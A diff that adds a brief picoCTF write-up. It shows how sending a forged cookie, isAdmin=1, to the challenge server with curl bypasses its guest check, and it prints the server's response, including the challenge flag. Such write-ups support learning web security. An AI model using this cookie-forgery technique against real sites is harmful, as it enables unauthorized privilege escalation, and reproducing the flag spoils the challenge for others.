@@ -1,0 +1,18 @@
+After logging in as a guest we can see that there's a cookie given to us with the name `isAdmin` and value 0.
+All we need to do is set the value to 1 and we can get the flag.
+
+> curl http://saturn.picoctf.net:55287/check.php --cookie "isAdmin=1"
+
+
+
+
+<html>
+<body>
+
+
+
+<p>picoCTF{gr4d3_A_c00k13_5d2505be}</p>
+
+
+</body>
+</html>
